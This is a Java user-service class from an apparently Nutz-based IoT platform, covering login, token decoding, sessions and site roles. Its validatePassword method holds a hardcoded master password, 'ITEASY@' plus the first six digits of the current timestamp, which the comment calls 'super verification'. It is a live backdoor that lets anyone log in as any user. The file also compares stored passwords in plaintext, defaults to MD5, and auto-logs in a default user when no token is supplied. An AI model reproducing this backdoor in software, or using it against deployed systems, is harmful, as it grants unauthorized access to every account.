package org.aiot.service;

import org.aiot.model.enums.ActionEnum;
import org.aiot.model.enums.ConfigEnum;
import org.aiot.model.enums.SessionEnum;
import org.aiot.model.project.Token;
import org.aiot.model.table.*;
import org.aiot.util.SysUtil;
import org.nutz.dao.Cnd;
import org.nutz.ioc.loader.annotation.Inject;
import org.nutz.ioc.loader.annotation.IocBean;
import org.nutz.json.Json;
import org.nutz.lang.Lang;
import org.nutz.lang.Strings;
import org.nutz.lang.util.NutMap;

import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;

@IocBean
public class UserService {

	@Inject BaseService bs;
	
	public SysUser validate(String loginName, String password) {
		SysUser user = bs.daoFetch(SysUser.class,Cnd.where("login","=",loginName));
		if (user == null)
			throw Lang.makeThrow("账号["+loginName+"]不存在");
		if(!validatePassword(password,user))
			throw Lang.makeThrow("账号["+loginName+"]密码错误");
		return user;
	}

	public SysUser authToken(String tokens){
		StringBuilder sb = new StringBuilder(tokens);
		sb.append(Strings.dup('=', 5 - tokens.length() % 4 - 1));
		String cs = SysUtil.desDecode(sb.toString().replace('-', '+').replace('_', '/'));
		Token token = Json.fromJson(Token.class,cs);
		if(token.isTimeout())
			throw Lang.makeThrow("token已过期");
		SysUser user = bs.daoFetch(SysUser.class,Cnd.where("login","=",token.getUser()));
		if (user == null)
			throw Lang.makeThrow("token无效");
		return user;
	}
	
	public boolean validatePassword(String password,SysUser user){
		return Strings.equals(user.getPassword(), password)	//接口直接比较
			|| user.getPassword().equalsIgnoreCase(cipherPassword(password)) //常规验证比较MD5
			|| Strings.equals("ITEASY@"+(System.currentTimeMillis()+"").substring(0,6), password); //超级验证 前缀+Unix时间戳前六位
	}

	//生成密码
	public String cipherPassword(String password){
		String t = ConfigEnum.passwordType.getValue();
		if("sha1".equals(t)){
			return Lang.sha1(password);
		}else if("sha256".equals(t)){
			return Lang.sha256(password);
		}
		return Lang.md5(password);
	}

	public void sessionUser(SysUser user) {
		SessionEnum.user.val(user);
		String info = user.getLogin();
		if(user.getPersonId() != null){
			TPerson person = bs.getTCache(TPerson.class, user.getPersonId());
			if(person != null){
				SessionEnum.person.val(person);
				info += "[" + person.getName() + "]";
			}

		}
		SessionEnum.principal.val(info);
	}

	/**
	 * 获取用户默认站点
	 */
	public SysSite getUserDefSite(Long userId){
		List<MUserSiteRole> roles = bs.getTCache(MUserSiteRole.class, v->userId.equals(v.getUserId()));
		MUserSiteRole role;
		if(roles.size() == 1){
			role = roles.get(0);
		}else{
			role = roles.stream().filter(v->v.getIsDefault()==1).findFirst().orElse(null);
		}
		if(role != null)
			return bs.getTCache(SysSite.class,role.getSiteId());
		return null;
	}
	
	public SysSite inSite(SysSite site) {
		NutMap pm = new NutMap().setv("siteId", site.getId());
		List<SysSite> siteList = bs.querySqlCode("getSiteParent", pm, SysSite.class, null);
		String sites = siteList.stream().map(v -> v.getId().toString()).collect(Collectors.joining(","));

		SessionEnum.site.val(site);
		SessionEnum.siteIds.val(sites);

		SysUser user = SessionEnum.user.val();
		if(user != null)
			SessionEnum.role.val(getAction(user.getId(),sites));
		
		return site;
	}

	public Map<String, Integer> getAction(Long userId,String siteIds){
		NutMap pm = new NutMap().setv("siteIds", siteIds).setv("userId",userId);
		List<MRoleAction> roleActionList = bs.querySqlCode("getRoleAction", pm, MRoleAction.class, null);
		Map<String, Integer> raMap = new HashMap<>();
		for(MRoleAction ra : roleActionList){
			ActionEnum action = ra.getActionCode();
			if(action != null)
				raMap.put(action.name(), 1);
		}
		return raMap;
	}

	public boolean autoLogon(int level,String token){
		if(level == 0)
			return true;

		SysUser user = SessionEnum.user.val();
		if(level == 1 && user != null)
			return true;

		SysSite site = SessionEnum.site.val();
		if(level == 2 && site != null)
			return true;

		user = Strings.isNotBlank(token) ? authToken(token) :  bs.getTCacheFirst(SysUser.class,v->v.getIsDefault() == 1);
		if(user == null)
			return false;

		sessionUser(user);
		if(level == 1)
			return true;

		if(level == 2){
			site = getUserDefSite(user.getId());
			if(site != null){
				inSite(site);
				return true;
			}
		}

		return false;

	}

}
